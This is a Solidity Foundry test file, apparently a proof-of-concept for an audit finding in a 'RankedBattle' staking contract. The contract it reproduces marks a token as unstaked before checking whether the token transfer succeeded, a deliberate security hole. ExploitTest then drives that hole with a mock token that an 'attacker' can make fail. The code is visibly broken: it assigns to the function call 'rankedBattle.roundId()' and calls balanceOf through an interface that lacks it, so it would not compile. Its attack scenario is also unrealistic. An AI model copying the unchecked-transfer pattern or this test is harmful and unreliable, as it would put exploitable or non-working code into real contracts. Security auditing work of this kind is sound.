// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface INeuronToken {
    function transfer(address to, uint256 amount) external returns (bool);
    function mint(address to, uint256 amount) external;
}

interface IFighterFarm {
    function updateFighterStaking(uint256 tokenId, bool isStaked) external;
    function ownerOf(uint256 tokenId) external view returns (address);
}

contract RankedBattle {
    mapping(uint256 => mapping(uint256 => bool)) public hasUnstaked;
    mapping(uint256 => uint256) public amountStaked;
    INeuronToken public _neuronInstance;
    IFighterFarm public _fighterFarmInstance;
    uint256 public roundId;

    event Unstaked(address indexed user, uint256 amount);

    function unstakeNRN(uint256 tokenId, uint256 amount) external {
        hasUnstaked[tokenId][roundId] = true;
        bool success = _neuronInstance.transfer(msg.sender, amount);
        if (success) {
            if (amountStaked[tokenId] == 0) {
                _fighterFarmInstance.updateFighterStaking(tokenId, false);
            }
            emit Unstaked(msg.sender, amount);
        }
    }
}

contract ExploitTest is Test {
    RankedBattle rankedBattle;
    INeuronToken neuronToken;
    IFighterFarm fighterFarm;
    address attacker = address(0x1);
    uint256 tokenId = 1;
    uint256 roundId = 1;
    uint256 amount = 1000 ether;

    function setUp() public {
        // Deploy mock contracts
        neuronToken = INeuronToken(address(new MockNeuronToken()));
        fighterFarm = IFighterFarm(address(new MockFighterFarm()));
        rankedBattle = new RankedBattle();

        // Set up initial state
        vm.prank(address(rankedBattle));
        neuronToken.mint(address(rankedBattle), amount);

        // Fund attacker
        vm.deal(attacker, 1 ether);

        // Set roundId
        rankedBattle.roundId() = roundId;
    }

    function test_exploit() public {
        // Step 1: Attacker ensures transfer will fail by manipulating the token contract
        vm.prank(attacker);
        MockNeuronToken(address(neuronToken)).setTransferSuccess(false);

        // Step 2: Attacker calls unstakeNRN
        vm.prank(attacker);
        rankedBattle.unstakeNRN(tokenId, amount);

        // Step 3: Assert that the state is incorrectly updated
        assertTrue(rankedBattle.hasUnstaked(tokenId, roundId), "Unstake flag should be true");
        assertEq(neuronToken.balanceOf(attacker), 0, "Attacker should not receive tokens");
    }
}

contract MockNeuronToken is INeuronToken {
    bool private transferSuccess = true;
    mapping(address => uint256) private balances;

    function transfer(address to, uint256 amount) external override returns (bool) {
        if (transferSuccess) {
            balances[to] += amount;
            return true;
        }
        return false;
    }

    function mint(address to, uint256 amount) external override {
        balances[to] += amount;
    }

    function setTransferSuccess(bool success) external {
        transferSuccess = success;
    }

    function balanceOf(address account) external view returns (uint256) {
        return balances[account];
    }
}

contract MockFighterFarm is IFighterFarm {
    mapping(uint256 => address) private owners;

    function updateFighterStaking(uint256 tokenId, bool isStaked) external override {}

    function ownerOf(uint256 tokenId) external view override returns (address) {
        return owners[tokenId];
    }
}